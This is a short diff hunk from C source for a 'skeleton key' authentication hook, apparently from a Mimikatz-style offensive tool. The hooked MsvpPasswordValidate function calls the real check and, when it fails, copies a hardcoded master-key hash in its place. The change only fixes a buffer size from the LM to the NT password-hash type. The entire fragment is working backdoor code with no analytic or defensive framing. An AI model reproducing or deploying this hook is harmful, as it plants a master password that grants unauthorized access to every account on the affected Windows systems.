@@ -23,7 +23,7 @@ BOOL WINAPI Skel_MsvpPasswordValidate(LPSTR unk1, NETLOGON_LOGON_INFO_CLASS unk2
 	status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, unk2, NTstruct, pRealPassword, unk3, unk4, unk5); // validate real hash
 	if (!status)
 	{
-		pCopyPassword = (PNT_OWF_PASSWORD)((PLOCALALLOC)0x4242424242424242)(LPTR, sizeof(LM_OWF_PASSWORD));
+		pCopyPassword = (PNT_OWF_PASSWORD)((PLOCALALLOC)0x4242424242424242)(LPTR, sizeof(NT_OWF_PASSWORD));
 		if (pCopyPassword)
 		{
 			((PMEMCPY)0x4141414141414141)(pCopyPassword, SkeletonKey, 0x10);
